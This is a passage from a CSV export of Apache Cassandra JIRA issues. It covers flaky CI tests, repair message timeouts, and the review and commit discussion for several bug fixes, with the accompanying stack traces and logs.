butler url: [https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.1/Cassandra-4.1]
jenkins url: [https://ci-cassandra.apache.org/job/Cassandra-4.1/24/]
JIRA: CASSANDRA-17615
commit url: [https://git-wip-us.apache.org/repos/asf?p=cassandra.git;a=commit;h=27b5a017eaeb692cead5266cef43175b729fbe88]
affected paths:
 * test/unit/org/apache/cassandra/cql3/KeywordTest.java
 * test/unit/org/apache/cassandra/cql3/KeywordTestSplit2.java
 * test/unit/org/apache/cassandra/cql3/KeywordTestBase.java
 * test/unit/org/apache/cassandra/cql3/KeywordTestSplit1.java

Build Result: UNSTABLE
Passing Tests: 47192
Failing Tests: 20
||Test|Failures|JIRA|
|cql3.validation.operations.CompactStorageTest.testIndicesOnCompactTable|6 of 22|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|db.SinglePartitionSliceCommandTest.testPartitionDeletionRowDeletionTie-cdc|3 of 22|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-large-novnode.materialized_views_test.TestMaterializedViews.test_add_dc_after_mv_network_replication|1 of 22|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|net.ProxyHandlerConnectionsTest.suddenDisconnect-compression|1 of 22|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|cql3.validation.operations.CompactStorageTest.testUpdate|2 of 22|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-novnode.topology_test.TestTopology.test_simple_decommission|1 of 22|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|distributed.test.SchemaTest.readRepairWithCompaction|3 of 22|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|net.ProxyHandlerConnectionsTest.testExpireSome-compression|2 of 22|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|cql3.validation.entities.SecondaryIndexTest.testCanQuerySecondaryIndex|1 of 22|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|cql3.ViewFilteringClustering1Test.terminated successfully|1 of 22|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestUpgrade_indev_3_11_x_To_indev_4_1_x.test_bootstrap_multidc|1 of 22|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestUpgrade_current_3_0_x_To_indev_4_1_x.test_rolling_upgrade_with_internode_ssl|2 of 22|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|distributed.upgrade.MixedModeReadRepairWriteTest.mixedModeReadRepairUpdate|1 of 22|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-upgrade.upgrade_tests.drop_compact_storage_upgrade_test.TestDropCompactStorage.test_drop_compact_storage_mixed_cluster|2 of 22|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|distributed.test.InternodeEncryptionEnforcementTest.testConnectionsAreRejectedWithInvalidConfig|1 of 22|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|cql3.validation.entities.SecondaryIndexTest.testWithEmptyRestrictionValueAndSecondaryIndex|2 of 22|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|cql3.validation.entities.SecondaryIndexTest.testIndexOnFrozenUDT|1 of 22|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|cql3.ViewComplexTTLTest.testUpdateColumnInViewPKWithTTLWithFlush[3]|3 of 22|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|auth.GrantAndRevokeTest.testGrantedKeyspace|1 of 22|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-novnode.cqlsh_tests.test_cqlsh_copy.TestCqlshCopy.test_copy_from_with_large_cql_rows|1 of 22|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|;;;","19/May/22 04:28;bereng;I don't think any useful info can be lifted from CI failures in jenkins atm. This just fixes a test class so I'd say everything is unrelated :shrug:;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix repair_tests/repair_test.py::TestRepair::test_non_replicated_ks_repair,CASSANDRA-17614,13444013,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,marcuse,marcuse,marcuse,09/May/22 15:47,10/May/22 13:38,13/Jul/23 08:40,10/May/22 13:38,4.0.4,,,,,,Test/dtest/python,,,,0,,"Seems we need to ignore non-related keyspaces after CASSANDRA-17594

https://ci-cassandra.apache.org/job/Cassandra-4.0/389/testReport/dtest.repair_tests.repair_test/TestRepair/test_non_replicated_ks_repair/
{code}
Unexpected error found in node logs (see stdout for full details). Errors: [[node3] 'ERROR [Repair-Task:1] 2022-05-05 15:07:53,951 RepairRunnable.java:178 - Repair 237883a0-cc85-11ec-8760-0b7eabc00dbb failed:\njava.lang.RuntimeException: Nothing to repair for (0,1] in system_traces - aborting\n\tat org.apache.cassandra.repair.RepairRunnable.getNeighborsAndRanges(RepairRunnable.java:338)\n\tat org.apache.cassandra.repair.RepairRunnable.runMayThrow(RepairRunnable.java:265)\n\tat org.apache.cassandra.repair.RepairRunnable.run(RepairRunnable.java:241)\n\tat java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511)\n\tat java.util.concurrent.FutureTask.run(FutureTask.java:266)\n\tat java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511)\n\tat java.util.concurrent.FutureTask.run(FutureTask.java:266)\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\n\tat io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)\n\tat java.lang.Thread.run(Thread.java:748)']
{code}",,bereng,marcuse,,,,,,,,,,,,,"krummas merged PR #194:
URL: https://github.com/apache/cassandra-dtest/pull/194


;10/May/22 13:37;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,marcuse,,,,,,,,,,,,,,Degradation -> Other Exception,,,,,,,,Low Hanging Fruit,DTest,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue May 10 13:38:30 UTC 2022,,,,,,,All,,,,"0|z127bs:",9223372036854775807,,,,bereng,,,,Low,,4.0.3,,https://github.com/apache/cassandra-dtest/commit/e76008d0a71bce385210e7cdf820c9b6459b8c80,,,,,,,,,jenkins run,,,,,"09/May/22 15:50;marcuse;https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1689/
https://github.com/apache/cassandra-dtest/pull/194;;;","10/May/22 08:42;bereng;Ignoring all KS repair messages seems safe as the operation is going to fail anyway. Also proper KS repair behavior has already been checked in the previous lines of the test. This looks safe to merge without having CI for all branches despite being a dtest. LGTM +1;;;","10/May/22 13:38;marcuse;and committed, thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Avoid getting hanging repairs due to repair message timeouts,CASSANDRA-17613,13443937,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,marcuse,marcuse,marcuse,09/May/22 08:54,05/Oct/22 22:22,13/Jul/23 08:40,29/Aug/22 11:35,4.0.7,4.1-beta1,,,,,Consistency/Repair,,,,0,,"In 4.0 repair messages can get expired before reaching a replica, this causes repairs to hang.

CASSANDRA-16909 is meant to fix this, but we need a stopgap fix in 4.0.",,adelapena,blerer,dcapwell,e.dimitrova,marcuse,,,,,,,,,,"dcapwell commented on code in PR #1611:
URL: https://github.com/apache/cassandra/pull/1611#discussion_r940406567


##########
src/java/org/apache/cassandra/config/Config.java:
##########
@@ -134,6 +134,8 @@
     public volatile Integer repair_session_max_tree_depth = null;
     public volatile Integer repair_session_space_in_mb = null;
 
+    public volatile long repair_message_timeout_in_ms = TimeUnit.MILLISECONDS.convert(1, TimeUnit.MINUTES);

Review Comment:
   when this gets added to 4.1 should this also be migrated?  Feels weird to migrate as its new... @ekaterinadimitrova2 thoughts?  Should we just add the needed data types so we can do `DurationSpec repair_message_timeout = DurationSpec.ofMinutes(1);`?



##########
src/java/org/apache/cassandra/repair/messages/RepairMessage.java:
##########
@@ -26,10 +42,57 @@
  */
 public abstract class RepairMessage
 {
+    private static final CassandraVersion SUPPORTS_TIMEOUTS = new CassandraVersion(""4.0.4-SNAPSHOT""); // todo: should be 4.0.5 (4.0.4 is about to be cut)

Review Comment:
   should be 4.0.6 at this point: 4.0.5 released on July 18



;08/Aug/22 16:10;githubbot;600","ekaterinadimitrova2 commented on code in PR #1611:
URL: https://github.com/apache/cassandra/pull/1611#discussion_r940433202


##########
src/java/org/apache/cassandra/config/Config.java:
##########
@@ -134,6 +134,8 @@
     public volatile Integer repair_session_max_tree_depth = null;
     public volatile Integer repair_session_space_in_mb = null;
 
+    public volatile long repair_message_timeout_in_ms = TimeUnit.MILLISECONDS.convert(1, TimeUnit.MINUTES);

Review Comment:
   I see your point but honestly, I am not sure. It seems like something that might require consensus on the mailing list? If we consider we might also have other similar cases in the future? 



;08/Aug/22 16:24;githubbot;600","ekaterinadimitrova2 commented on code in PR #1611:
URL: https://github.com/apache/cassandra/pull/1611#discussion_r941810782


##########
src/java/org/apache/cassandra/config/Config.java:
##########
@@ -134,6 +134,8 @@
     public volatile Integer repair_session_max_tree_depth = null;
     public volatile Integer repair_session_space_in_mb = null;
 
+    public volatile long repair_message_timeout_in_ms = TimeUnit.MILLISECONDS.convert(1, TimeUnit.MINUTES);

Review Comment:
   Side note: if we decide not to port them and to deprecate as others in. 4.1, don't forget we also need a ccm patch, a new entry here - https://github.com/riptano/ccm/blob/4609ac46beccd3ab86463a345ed59e998d664d04/ccmlib/common.py#L155



;09/Aug/22 21:16;githubbot;600","dcapwell commented on code in PR #1775:
URL: https://github.com/apache/cassandra/pull/1775#discussion_r944907781


##########
src/java/org/apache/cassandra/repair/messages/RepairMessage.java:
##########
@@ -26,10 +42,57 @@
  */
 public abstract class RepairMessage
 {
+    private static final CassandraVersion SUPPORTS_TIMEOUTS = new CassandraVersion(""4.0.4-SNAPSHOT""); // todo: should be 4.0.5 (4.0.4 is about to be cut)

Review Comment:
   think its 4.0.6?



;12/Aug/22 22:28;githubbot;600","dcapwell commented on code in PR #1776:
URL: https://github.com/apache/cassandra/pull/1776#discussion_r944908199


##########
src/java/org/apache/cassandra/repair/messages/RepairMessage.java:
##########
@@ -26,10 +42,57 @@
  */
 public abstract class RepairMessage
 {
+    private static final CassandraVersion SUPPORTS_TIMEOUTS = new CassandraVersion(""4.0.4-SNAPSHOT""); // todo: should be 4.0.5 (4.0.4 is about to be cut)

Review Comment:
   think its 4.0.6?



;12/Aug/22 22:28;githubbot;600","smiklosovic closed pull request #1611: CASSANDRA-17613 Improve the way we handle repair message timeouts to avoid hanging repairs
URL: https://github.com/apache/cassandra/pull/1611


;29/Aug/22 14:11;githubbot;600","smiklosovic closed pull request #1776: CASSANDRA-17613
URL: https://github.com/apache/cassandra/pull/1776


;29/Aug/22 14:12;githubbot;600","smiklosovic closed pull request #1775: CASSANDRA-17613
URL: https://github.com/apache/cassandra/pull/1775


;29/Aug/22 14:12;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,4800,,,0,4800,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,marcuse,,,,,,,,,,,,,,Degradation -> Slow Use Case,,,,,,,,Low Hanging Fruit,Adhoc Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Aug 29 11:35:26 UTC 2022,,,,,,,All,,,,"0|z126uw:",9223372036854775807,,,,dcapwell,,,,Normal,,4.0-alpha1,,https://github.com/apache/cassandra/commit/5beab63b5550efb5e31e5005f90649661a9fe595,,,,,,,,,cci run,,,,,"09/May/22 09:07;marcuse;https://github.com/apache/cassandra/pull/1611

* increases timeout from 10s to 1 minute for the repair messages
* additionally bumps timeout for VALIDATION_RSP to 5 minutes
* adds an error callback when sending SYNC_REQ and VALIDATION_REQ messages to avoid the hanging repairs

tests: https://app.circleci.com/pipelines/github/krummas/cassandra?branch=marcuse%2F17613&filter=all;;;","05/Aug/22 16:23;e.dimitrova;[~marcuse], [~dcapwell] if this is a long known issue and not recent regression, is this ticket a beta blocker?;;;","08/Aug/22 16:10;dcapwell;the 4.0 branch I am +1 with minor comments, [~marcuse] should we block 4.1?  Think we would need to as the 4.0 branch would assume that 4.1.0 would support this.;;;","08/Aug/22 16:13;marcuse;bq. should we block 4.1?
Yes, I think so - I'll provide a 4.1 PR tomorrow;;;","09/Aug/22 13:57;marcuse;4.1: https://github.com/apache/cassandra/pull/1775 / https://app.circleci.com/pipelines/github/krummas/cassandra/809/workflows/f99a3c25-0d16-4bd4-89db-d1c835ce7b6c
trunk: https://github.com/apache/cassandra/pull/1776 / https://app.circleci.com/pipelines/github/krummas/cassandra/807/workflows/72a6a1ef-2052-480e-a396-0cccfdf17efa;;;","12/Aug/22 22:29;dcapwell;+1 from me, but before merge we need to confirm the 4.0 version;;;","25/Aug/22 06:21;marcuse;tests look fine, I'll get this committed once 4.0.6 has been released (so we can set the correct 4.0 since version (4.0.7-SNAPSHOT) without breaking the tests)

4.0: https://app.circleci.com/pipelines/github/krummas/cassandra/810/workflows/d2ee32db-cbeb-4741-a674-ca0b4f9b2a81
4.1: https://app.circleci.com/pipelines/github/krummas/cassandra/814/workflows/5d10dc0a-0359-4e10-89ef-d4f8f9b2a187
trunk: https://app.circleci.com/pipelines/github/krummas/cassandra/815/workflows/4f388b44-c478-4682-a17b-52a04f99a163;;;","26/Aug/22 12:20;blerer;[~marcuse] 4.0.6 has been released. You are good to go. :);;;","29/Aug/22 11:35;marcuse;and committed, thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix replace_address_test.TestReplaceAddress.test_fail_when_seed,CASSANDRA-17611,13443496,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,e.dimitrova,e.dimitrova,06/May/22 00:16,14/Mar/23 20:00,13/Jul/23 08:40,14/Mar/23 20:00,3.0.27,3.11.13,,,,,CI,,,,0,,"Seen [with|https://ci-cassandra.apache.org/job/Cassandra-3.11/349/testReport/dtest.replace_address_test/TestReplaceAddress/test_fail_when_seed/] and [without vnode|https://ci-cassandra.apache.org/job/Cassandra-3.11/348/testReport/dtest-novnode.replace_address_test/TestReplaceAddress/test_fail_when_seed/]:
{code:java}
Error Message
test teardown failure

Stacktrace
Unexpected error found in node logs (see stdout for full details). Errors: [ERROR [MessagingService-Incoming-/127.0.0.1] 2022-04-28 22:04:36,765 CassandraDaemon.java:244 - Exception in thread Thread[MessagingService-Incoming-/127.0.0.1,5,main] java.util.concurrent.RejectedExecutionException: ThreadPoolExecutor has shut down at org.apache.cassandra.concurrent.DebuggableThreadPoolExecutor$1.rejectedExecution(DebuggableThreadPoolExecutor.java:58) at java.util.concurrent.ThreadPoolExecutor.reject(ThreadPoolExecutor.java:830) at java.util.concurrent.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:1379) at org.apache.cassandra.concurrent.DebuggableThreadPoolExecutor.execute(DebuggableThreadPoolExecutor.java:148) at org.apache.cassandra.net.MessagingService.receive(MessagingService.java:1035) at org.apache.cassandra.net.IncomingTcpConnection.receiveMessage(IncomingTcpConnection.java:215) at org.apache.cassandra.net.IncomingTcpConnection.receiveMessages(IncomingTcpConnection.java:195) at org.apache.cassandra.net.IncomingTcpConnection.run(IncomingTcpConnection.java:98), ERROR [MessagingService-Incoming-/127.0.0.1] 2022-04-28 22:04:36,765 CassandraDaemon.java:244 - Exception in thread Thread[MessagingService-Incoming-/127.0.0.1,5,main] java.util.concurrent.RejectedExecutionException: ThreadPoolExecutor has shut down at org.apache.cassandra.concurrent.DebuggableThreadPoolExecutor$1.rejectedExecution(DebuggableThreadPoolExecutor.java:58) at java.util.concurrent.ThreadPoolExecutor.reject(ThreadPoolExecutor.java:830) at java.util.concurrent.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:1379) at org.apache.cassandra.concurrent.DebuggableThreadPoolExecutor.execute(DebuggableThreadPoolExecutor.java:148) at org.apache.cassandra.net.MessagingService.receive(MessagingService.java:1035) at org.apache.cassandra.net.IncomingTcpConnection.receiveMessage(IncomingTcpConnection.java:215) at org.apache.cassandra.net.IncomingTcpConnection.receiveMessages(IncomingTcpConnection.java:195) at org.apache.cassandra.net.IncomingTcpConnection.run(IncomingTcpConnection.java:98)]
{code}
 ",,bereng,e.dimitrova,jonmeredith,xgerman42,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Mar 14 20:00:01 UTC 2023,,,,,,,All,,,,"0|z1245s:",9223372036854775807,,,,bereng,,,,Normal,,NA,,https://github.com/apache/cassandra-dtest/commit/8b7c3cc693e8a3ae2741b6883333365c3ab87c56,,,,,,,,,run CI,,,,,"06/May/22 00:19;e.dimitrova;Another one failing in similar fashion, linking here:
dtest-novnode.replace_address_test.TestReplaceAddress.test_unsafe_replace

 

[https://ci-cassandra.apache.org/job/Cassandra-3.11/349/testReport/dtest-novnode.replace_address_test/TestReplaceAddress/test_unsafe_replace/]
h3.  
{code:java}
Error Message
test teardown failure

Stacktrace
Unexpected error found in node logs (see stdout for full details). Errors: [ERROR [MessagingService-Incoming-/127.0.0.1] 2022-04-28 22:08:03,358 CassandraDaemon.java:244 - Exception in thread Thread[MessagingService-Incoming-/127.0.0.1,5,main] java.util.concurrent.RejectedExecutionException: ThreadPoolExecutor has shut down at org.apache.cassandra.concurrent.DebuggableThreadPoolExecutor$1.rejectedExecution(DebuggableThreadPoolExecutor.java:58) at java.util.concurrent.ThreadPoolExecutor.reject(ThreadPoolExecutor.java:830) at java.util.concurrent.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:1379) at org.apache.cassandra.concurrent.DebuggableThreadPoolExecutor.execute(DebuggableThreadPoolExecutor.java:148) at org.apache.cassandra.net.MessagingService.receive(MessagingService.java:1035) at org.apache.cassandra.net.IncomingTcpConnection.receiveMessage(IncomingTcpConnection.java:215) at org.apache.cassandra.net.IncomingTcpConnection.receiveMessages(IncomingTcpConnection.java:195) at org.apache.cassandra.net.IncomingTcpConnection.run(IncomingTcpConnection.java:98), ERROR [MessagingService-Incoming-/127.0.0.1] 2022-04-28 22:08:03,358 CassandraDaemon.java:244 - Exception in thread Thread[MessagingService-Incoming-/127.0.0.1,5,main] java.util.concurrent.RejectedExecutionException: ThreadPoolExecutor has shut down at org.apache.cassandra.concurrent.DebuggableThreadPoolExecutor$1.rejectedExecution(DebuggableThreadPoolExecutor.java:58) at java.util.concurrent.ThreadPoolExecutor.reject(ThreadPoolExecutor.java:830) at java.util.concurrent.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:1379) at org.apache.cassandra.concurrent.DebuggableThreadPoolExecutor.execute(DebuggableThreadPoolExecutor.java:148) at org.apache.cassandra.net.MessagingService.receive(MessagingService.java:1035) at org.apache.cassandra.net.IncomingTcpConnection.receiveMessage(IncomingTcpConnection.java:215) at org.apache.cassandra.net.IncomingTcpConnection.receiveMessages(IncomingTcpConnection.java:195) at org.apache.cassandra.net.IncomingTcpConnection.run(IncomingTcpConnection.java:98)]
{code}
 ;;;","10/May/22 16:50;brandon.williams;This was caused by CASSANDRA-17524, but I have verified that 4.0 and above are not affected.  If this was an issue with all versions I would be leaning toward ignoring it, but since it's only with the 3.x commits I'm not sure.  [~jmeredithco] what do you think?;;;","10/May/22 17:25;jonmeredith;Sorry for the regression.

I think this is due to a difference in how the messaging service shuts down. In 3.0, {{MessagingService.instance().shutdown()}} is called before the {{gossipStage}} is shut down, however it looks like it only shuts down outgoing TCP connections, not incoming so it can keep receiving messages.  It is probably less likely to get the other types of mutation as the Gossiper is stopped, announcing shutdown to connected hosts. Sadly, shutting all instances down during a test is more likely to hit this path than regular operation.

I think ignoring the exception pre-4.0 is fine.

;;;","10/May/22 20:24;brandon.williams;That sounds good.

Patch to ignore REE on < 4.0 in these tests [here|https://github.com/driftx/cassandra-dtest/tree/CASSANDRA-17611] and 200 runs against it for test_fail_when_seed [here|https://app.circleci.com/pipelines/github/driftx/cassandra/462/workflows/ce2973f1-a3e2-4263-b8d7-1ee6bbb81919/jobs/5251].;;;","11/May/22 09:29;bereng;SGTM +1;;;","11/May/22 11:34;brandon.williams;Committed, thanks.;;;","06/Feb/23 19:08;xgerman42;Butler:
Branch: trunk

Build: #1448

https://butler.cassandra.apache.org/#/ci/upstream/workflow/Cassandra-trunk/failure/replace_address_test/TestReplaceAddress/test_fail_when_seed;;;","14/Mar/23 20:00;brandon.williams;Unrelated environmental timeout.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix org.apache.cassandra.db.compaction.CompactionsCQLTest.testLCSThresholdParams-cdc (from org.apache.cassandra.db.compaction.CompactionsCQLTest-cdc),CASSANDRA-17609,13443489,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,adelapena,e.dimitrova,e.dimitrova,05/May/22 23:24,05/Oct/22 22:30,13/Jul/23 08:40,06/Jun/22 11:33,4.0.5,4.1,4.1-alpha1,5.0,,,CI,,,,0,,"{color:#172b4d}[https://ci-cassandra.apache.org/job/Cassandra-4.1/5/testReport/org.apache.cassandra.db.compaction/CompactionsCQLTest/testLCSThresholdParams_cdc_2/]{color}
h3.  
{code:java}
Error Message
expected:<50> but was:<51>

Stacktrace
junit.framework.AssertionFailedError: expected:<50> but was:<51> at org.apache.cassandra.db.compaction.CompactionsCQLTest.testLCSThresholdParams(CompactionsCQLTest.java:419) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
{code}
 ",,adelapena,e.dimitrova,,,,,,,,,,,,,"smiklosovic closed pull request #1661: CASSANDRA-17609 4.1: Fix flaky CompactionsCQLTest by reseting the commitlog
URL: https://github.com/apache/cassandra/pull/1661


;17/Jun/22 07:28;githubbot;600","smiklosovic closed pull request #1660: CASSANDRA-17609 4.0: Fix flaky CompactionsCQLTest by reseting the commitlog
URL: https://github.com/apache/cassandra/pull/1660


;17/Jun/22 07:28;githubbot;600","smiklosovic closed pull request #1657: CASSANDRA-17609 trunk: Fix flaky CompactionsCQLTest by reseting the commitlog
URL: https://github.com/apache/cassandra/pull/1657


;17/Jun/22 07:29;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,1800,,,0,1800,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,adelapena,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Jun 06 11:31:15 UTC 2022,,,,,,,All,,,,"0|z12448:",9223372036854775807,,,,brandon.williams,,,,Normal,,4.0,,https://github.com/apache/cassandra/commit/52f6ac4af91bdda4e177fdfc6342944047ab2e3c,,,,,,,,,Repeated runs of the affected test suite are included.,,,,,"01/Jun/22 17:38;adelapena;The test can also fail without CDC, also with a pretty low flakiness, as it is shown by [this repeated run|https://app.circleci.com/pipelines/github/adelapena/cassandra/1641/workflows/7dd9bb59-3e8f-4889-ab84-bcfe4aca6297].

As a clue, the test passes when running isolated from the rest of the tests on {{{}CompactionsCQLTest{}}}. This is shown by [this other run|https://app.circleci.com/pipelines/github/adelapena/cassandra/1637/workflows/287964de-8ab3-4c84-8c03-bdc87fd8858e]. So it seems that the problem is due to the interaction with the other tests.

If we dig into the logs we can find the messages informing about the 50 flushes requested by the test. Thanks to the changes recently introduced by CASSANDRA-17034, those flushes have a ""reason"" property that is included in the the log message. The reason for the 50 flushes explicitly requested by the test is {{{}UNIT_TESTS{}}}. However, the logs for the failed runs contain an additional flush with {{COMMITLOG_DIRTY}} as the reason. Also, those flushes seem to appear among messages generated by the asynchronous {{CQLTester}} task that cleans up the data of the previous tests:
{code:java}
...
[junit-timeout] INFO  [OptionalTasks:1] 2022-05-30 16:05:45,164 ColumnFamilyStore.java:1010 - Enqueuing flush of cql_test_keyspace.table_07, Reason: COMMITLOG_DIRTY, Usage: 0.745KiB (0%) on-heap, 400.133KiB (0%) off-heap
[junit-timeout] INFO  [OptionalTasks:1] 2022-05-30 16:05:45,165 ColumnFamilyStore.java:1010 - Enqueuing flush of system.local, Reason: COMMITLOG_DIRTY, Usage: 0.370KiB (0%) on-heap, 0.289KiB (0%) off-heap
[junit-timeout] INFO  [NonPeriodicTasks:1] 2022-05-30 16:05:45,166 LogTransaction.java:242 - Unfinished transaction log, deleting /tmp/cassandra/build/test/cassandra/data/system_schema/tables-afddfb9dbc1e30688056eed6c302ba09/nb-29-big-Data.db 
[junit-timeout] INFO  [NonPeriodicTasks:1] 2022-05-30 16:05:45,166 SSTable.java:127 - Deleting sstable: /tmp/cassandra/build/test/cassandra/data/system_schema/tables-afddfb9dbc1e30688056eed6c302ba09/nb-29-big
[junit-timeout] INFO  [NonPeriodicTasks:1] 2022-05-30 16:05:45,166 PathUtils.java:74 - Deleting file during startup: /tmp/cassandra/build/test/cassandra/data/system_schema/tables-afddfb9dbc1e30688056eed6c302ba09/nb-29-big-Index.db
[junit-timeout] INFO  [NonPeriodicTasks:1] 2022-05-30 16:05:45,166 PathUtils.java:74 - Deleting file during startup: /tmp/cassandra/build/test/cassandra/data/system_schema/tables-afddfb9dbc1e30688056eed6c302ba09/nb-29-big-CompressionInfo.db
[junit-timeout] INFO  [NonPeriodicTasks:1] 2022-05-30 16:05:45,166 PathUtils.java:74 - Deleting file during startup: /tmp/cassandra/build/test/cassandra/data/system_schema/tables-afddfb9dbc1e30688056eed6c302ba09/nb-29-big-Statistics.db
[junit-timeout] INFO  [NonPeriodicTasks:1] 2022-05-30 16:05:45,167 PathUtils.java:74 - Deleting file during startup: /tmp/cassandra/build/test/cassandra/data/system_schema/tables-afddfb9dbc1e30688056eed6c302ba09/nb-29-big-Digest.crc32
[junit-timeout] INFO  [NonPeriodicTasks:1] 2022-05-30 16:05:45,167 PathUtils.java:74 - Deleting file during startup: /tmp/cassandra/build/test/cassandra/data/system_schema/tables-afddfb9dbc1e30688056eed6c302ba09/nb-29-big-Filter.db
